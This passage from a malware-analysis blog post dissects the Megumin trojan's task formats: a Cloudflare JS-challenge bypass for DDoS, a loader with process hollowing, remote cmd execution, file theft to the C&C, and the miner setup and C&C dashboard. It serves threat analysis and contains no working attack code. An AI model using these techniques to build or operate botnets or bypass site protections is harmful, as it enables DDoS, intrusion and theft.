<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="688" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_ddos_tcp/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_tcp.png?fit=679%2C432&amp;ssl=1" data-orig-size="679,432" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_ddos_tcp" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_tcp.png?fit=300%2C191&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_tcp.png?fit=679%2C432&amp;ssl=1" class="alignnone size-full wp-image-688" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_tcp.png?resize=679%2C432&#038;ssl=1" alt="megumin_ddos_tcp" width="679" height="432" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_tcp.png?w=679&amp;ssl=1 679w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_ddos_tcp.png?resize=300%2C191&amp;ssl=1 300w" sizes="auto, (max-width: 679px) 100vw, 679px" /></p>
<h4>JS Bypass</h4>
<p>Task format</p>
<pre>jsbypass|time|threads|link</pre>
<p>When the website is using Cloudflare protection, the malware is also configured to use a known trick to bypass it by creating a clearance cookie for not being able to be challenged anymore.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="680" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_js_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_01.png?fit=633%2C237&amp;ssl=1" data-orig-size="633,237" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_js_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_01.png?fit=300%2C112&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_01.png?fit=633%2C237&amp;ssl=1" class="alignnone size-full wp-image-680" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_01.png?resize=633%2C237&#038;ssl=1" alt="megumin_js_01" width="633" height="237" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_01.png?w=633&amp;ssl=1 633w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_01.png?resize=300%2C112&amp;ssl=1 300w" sizes="auto, (max-width: 633px) 100vw, 633px" /></p>
<p>The idea is when it&#8217;s reaching for the first time the Website, a 503 error page will redirecting the attacker into a waiting page (catchable by the string &#8220;Just a moment&#8221; as shown above), At this moment Cloudflare is, in fact, sending the challenging request,  so a __cfduid cookie is generated and the content of the source code on this page is fetched by the help of a parser implemented in the malware. It needs 3 parameters at least, 2 of them are already available :</p>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="344"></colgroup>
<tbody>
<tr>
<td align="left" height="17">jschl_vc</td>
<td align="left">the challenge token</td>
</tr>
<tr>
<td align="left" height="17">pass</td>
<td align="left">???</td>
</tr>
</tbody>
</table>
<p>The last field is the jschl_answer, as guessable this is the answer to the challenge asked by Cloudflare. To solve it, an interpreter was also implemented to parse the js code, catching the challenge-form value and a.value field for interpreting correctly the native code with the right setup.</p>
<p>This process shown as below is the interpreter that will analyze block per block the challenge with the help of a loop, the data is shelled and each block will be converted into an integer value, the sum of all of them will give us the jschl_answer value.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="684" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_js_05/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?fit=1030%2C750&amp;ssl=1" data-orig-size="1030,750" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_js_05" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?fit=300%2C218&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?fit=900%2C656&amp;ssl=1" class="alignnone size-full wp-image-684" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?resize=900%2C655&#038;ssl=1" alt="megumin_js_05" width="900" height="655" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?w=1030&amp;ssl=1 1030w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_05.png?resize=1024%2C746&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>so at the end of the waiting page, this request is sent:</p>
<pre>/cdn-cgi/l/chk_jschl?jschl_vc=VALUE&amp;pass=VALUE&amp;jschl_answer=VALUE</pre>
<div class="tiled-gallery type-rectangular tiled-gallery-unresized" data-original-width="900" data-carousel-extra='{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/fumik0.com\/2019\/05\/03\/lets-nuke-megumin-trojan\/&quot;,&quot;likes_blog_id&quot;:140610880}' itemscope itemtype="http://schema.org/ImageGallery" > <div class="gallery-row" style="width: 900px; height: 227px;" data-original-width="900" data-original-height="227" > <div class="gallery-group images-1" style="width: 900px; height: 227px;" data-original-width="900" data-original-height="227" > <div class="tiled-gallery-item tiled-gallery-item-large" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"> <a href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_js_02/" border="0" itemprop="url"> <meta itemprop="width" content="896"> <meta itemprop="height" content="223"> <img decoding="async" class="" data-attachment-id="681" data-orig-file="https://fumik0.com/wp-content/uploads/2019/04/megumin_js_02.png" data-orig-size="430,107" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_js_02" data-image-description="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_02.png?fit=300%2C75&#038;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_02.png?fit=430%2C107&#038;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_02.png?w=896&#038;h=223&#038;ssl=1" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_02.png?w=430&amp;ssl=1 430w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_02.png?resize=300%2C75&amp;ssl=1 300w" width="896" height="223" loading="lazy" data-original-width="896" data-original-height="223" itemprop="http://schema.org/image" title="megumin_js_02" alt="megumin_js_02" style="width: 896px; height: 223px;" /> </a> </div> </div> <!-- close group --> </div> <!-- close row --> <div class="gallery-row" style="width: 900px; height: 183px;" data-original-width="900" data-original-height="183" > <div class="gallery-group images-1" style="width: 420px; height: 183px;" data-original-width="420" data-original-height="183" > <div class="tiled-gallery-item tiled-gallery-item-large" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"> <a href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_js_03/" border="0" itemprop="url"> <meta itemprop="width" content="416"> <meta itemprop="height" content="179"> <img decoding="async" class="" data-attachment-id="682" data-orig-file="https://fumik0.com/wp-content/uploads/2019/04/megumin_js_03.png" data-orig-size="264,114" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_js_03" data-image-description="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_03.png?fit=264%2C114&#038;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_03.png?fit=264%2C114&#038;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_03.png?w=416&#038;h=179&#038;ssl=1" width="416" height="179" loading="lazy" data-original-width="416" data-original-height="179" itemprop="http://schema.org/image" title="megumin_js_03" alt="megumin_js_03" style="width: 416px; height: 179px;" /> </a> </div> </div> <!-- close group --> <div class="gallery-group images-1" style="width: 480px; height: 183px;" data-original-width="480" data-original-height="183" > <div class="tiled-gallery-item tiled-gallery-item-large" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"> <a href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_js_04/" border="0" itemprop="url"> <meta itemprop="width" content="476"> <meta itemprop="height" content="179"> <img decoding="async" class="" data-attachment-id="683" data-orig-file="https://fumik0.com/wp-content/uploads/2019/04/megumin_js_04.png" data-orig-size="324,122" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_js_04" data-image-description="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_04.png?fit=300%2C113&#038;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_04.png?fit=324%2C122&#038;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_04.png?w=476&#038;h=179&#038;ssl=1" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_04.png?w=324&amp;ssl=1 324w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_js_04.png?resize=300%2C113&amp;ssl=1 300w" width="476" height="179" loading="lazy" data-original-width="476" data-original-height="179" itemprop="http://schema.org/image" title="megumin_js_04" alt="megumin_js_04" style="width: 476px; height: 179px;" /> </a> </div> </div> <!-- close group --> </div> <!-- close row --> </div>
<p>chk_jschl leads to the cf_clearance cookie creation if the answer to the challenge is correct and this cookie is proof that you are authentic and trusted by Cloudflare, so by keeping it bypasses for the next requests sent, the website will no longer challenging the attacker temporarily.</p>
<h4>Miscellaneous curiosities</h4>
<p>the default values for DDoS tasks are :</p>
<table border="0" cellspacing="0">
<colgroup width="124"></colgroup>
<colgroup width="344"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Time</td>
<td align="right">180 (in seconds)</td>
</tr>
<tr>
<td align="left" height="17">Threads</td>
<td align="right">2500</td>
</tr>
<tr>
<td align="left" height="17">Port</td>
<td align="right">42</td>
</tr>
</tbody>
</table>
<h3>Loader</h3>
<h4>Load</h4>
<p>Task format</p>
<pre>load|link</pre>
<p>Seeing a loader feature is something that a quite common thing by the current trendings, customers that bought malware wants to maximize their investments at all cost. This trojan is also configured to pushed some payloads. There is nothing much to say about this. The only important element, in this case, it&#8217;s that the loaded payload is stored into the %PROGRAMDATA% folder with the name of {MACHINE_GUID}.exe.</p>
<h4>Load PE</h4>
<p>Task format</p>
<pre>loadpe|link</pre>
<p>Contrary to a simple loader feature, this one is typically a process hollowing alternative. It&#8217;s only working with 32 bits payload and using this classy process injection trick into a legitimate process.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="695" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_loadpe/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_loadpe.png?fit=768%2C225&amp;ssl=1" data-orig-size="768,225" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_loadpe" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_loadpe.png?fit=300%2C88&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_loadpe.png?fit=768%2C225&amp;ssl=1" class="alignnone size-full wp-image-695" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_loadpe.png?resize=768%2C225&#038;ssl=1" alt="megumin_loadpe" width="768" height="225" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_loadpe.png?w=768&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_loadpe.png?resize=300%2C88&amp;ssl=1 300w" sizes="auto, (max-width: 768px) 100vw, 768px" /></p>
<p>For some reasons, the User-Agent &#8220;Mozilla/5.0 (Windows NT 6.1) Megumin/2.0&#8221; is catchable when it&#8217;s downloading the payload on this specific load PE task.</p>
<p>More information about process injections techniques <a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">here</a></p>
<h4>Update</h4>
<p>Task format</p>
<pre>update|build_link</pre>
<p>When there is an update required with the malware, there is a possibility to push a new build to the bot by using this task.</p>
<h3>Miscellaneous tasks</h3>
<h4>cmd</h4>
<p>Task format</p>
<pre>cmd|command</pre>
<p>One of the miscellaneous tasks possible is the possibility to send some cmd commands on the bot. I don&#8217;t have a clue about the necessity of this task, but if it&#8217;s implemented, there is a reason for that.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="697" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_cmd/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_cmd.png?fit=624%2C172&amp;ssl=1" data-orig-size="624,172" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_cmd" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_cmd.png?fit=300%2C83&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_cmd.png?fit=624%2C172&amp;ssl=1" class="alignnone size-full wp-image-697" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_cmd.png?resize=624%2C172&#038;ssl=1" alt="megumin_cmd" width="624" height="172" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_cmd.png?w=624&amp;ssl=1 624w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_cmd.png?resize=300%2C83&amp;ssl=1 300w" sizes="auto, (max-width: 624px) 100vw, 624px" /></p>
<p>Complete list available <a href="https://ss64.com/nt/">here</a></p>
<h4>upload</h4>
<p>Task format</p>
<pre>upload|fullpath</pre>
<p>If the attacker knows exactly what he&#8217;s doing, he can steal some really specific files on the bot, by indicating the full path of the required one. The crafted request at the end will be on that form, for pushing it on the C&amp;C.</p>
<pre>/gate?hwid=XXX</pre>
<h2>Miner</h2>
<p>The miner is one of the main features of the trojan. Most of the time, When analysts are reversing a miner, this is really easy to spot things and the main ideas are to understand the setup part and how it&#8217;s executing the miner software.</p>
<p>At the end for future purposes, I am considering their check-up list as relevant when reversing one:</p>
<ul>
<li>Is it targeting CPU, GPU or both?</li>
<li>If it&#8217;s GPU, is Nvidia &amp; AMD targeted?</li>
<li>Is it generating a JSON config?</li>
<li>What miner software is/are used</li>
<li>Are there any Blacklist Country or Specific countries spotted to mine?</li>
<li>What are the pools addresses?</li>
</ul>
<p>On this malware, Both hardware type has been implemented, and for checking which miner software is required on the GPU part, it only checking the name of the GPU on the bot, if Nvidia or AMD is spotted on the text, request to the C&amp;C will give the correct setup and miner software.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="699" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_miner_cpu_config/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?fit=903%2C77&amp;ssl=1" data-orig-size="903,77" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_miner_cpu_config" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?fit=300%2C26&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?fit=900%2C77&amp;ssl=1" class="alignnone size-full wp-image-699" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?resize=900%2C77&#038;ssl=1" alt="megumin_miner_cpu_config" width="900" height="77" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?w=903&amp;ssl=1 903w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?resize=300%2C26&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_miner_cpu_config.png?resize=768%2C65&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>The base64 downloaded miner config contains two things:</p>
<ul>
<li>The link of the miner software</li>
<li>The one-line config that will be executed with the downloaded payload by the help of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea">ShellExecuteA</a></li>
</ul>
<p>For some reasons, the User-Agent &#8220;Mozilla/5.0 (Windows NT 6.1) Megumin/2.0&#8221; is only catchable when it&#8217;s downloading the miner software for the CPU part, not for the GPU.</p>
<h2>Server-side</h2>
<h3>Login Page</h3>
<p>The login page is quite fancy, simplest. Even if I could be wrong of with this statement, it&#8217;s using the same core template as Supreme++ (Rarog Fork) with some tweaks.</p>
<p>Something interesting to notice with this C&amp;C, that there is no password but a 2FA Google authenticator on the authentication part.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="692" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?fit=1090%2C557&amp;ssl=1" data-orig-size="1090,557" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Megumin" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?fit=300%2C153&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?fit=900%2C460&amp;ssl=1" class="alignnone size-full wp-image-692" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?resize=900%2C460&#038;ssl=1" alt="Megumin" width="900" height="460" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?w=1090&amp;ssl=1 1090w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?resize=300%2C153&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?resize=768%2C392&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/Megumin.png?resize=1024%2C523&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h3>Dashboard</h3>
<p>There is not too much to say about the dashboard, its a classy stats page with these elements:</p>
<ul>
<li>Top Countries</li>
<li>New bots infected (weekly)</li>
<li>Bots Windows Chart</li>
<li>Number of bots online (weekly)</li>
<li>Bots CPU chart</li>
<li>Bots GPU chart</li>
<li>Platform chart</li>
<li>AV Stats</li>
<li>Current cryptocurrencies values</li>
<li>Top stolen wallet by the clipper</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="708" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_dashboard_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?fit=1152%2C788&amp;ssl=1" data-orig-size="1152,788" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_dashboard_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?fit=300%2C205&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?fit=900%2C615&amp;ssl=1" class="alignnone size-full wp-image-708" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?resize=900%2C616&#038;ssl=1" alt="megumin_dashboard_01" width="900" height="616" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?w=1152&amp;ssl=1 1152w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?resize=300%2C205&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?resize=768%2C525&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_01.png?resize=1024%2C700&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="707" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_dashboard_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?fit=772%2C796&amp;ssl=1" data-orig-size="772,796" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_dashboard_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?fit=291%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?fit=772%2C796&amp;ssl=1" class="alignnone size-full wp-image-707" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?resize=772%2C796&#038;ssl=1" alt="megumin_dashboard_02" width="772" height="796" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?w=772&amp;ssl=1 772w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?resize=291%2C300&amp;ssl=1 291w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_02.png?resize=768%2C792&amp;ssl=1 768w" sizes="auto, (max-width: 772px) 100vw, 772px" /><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="706" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_dashboard_03/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?fit=1141%2C396&amp;ssl=1" data-orig-size="1141,396" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_dashboard_03" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?fit=300%2C104&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?fit=900%2C312&amp;ssl=1" class="alignnone size-full wp-image-706" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?resize=900%2C312&#038;ssl=1" alt="megumin_dashboard_03" width="900" height="312" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?w=1141&amp;ssl=1 1141w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?resize=300%2C104&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?resize=768%2C267&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_03.png?resize=1024%2C355&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="705" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_dashboard_04/" 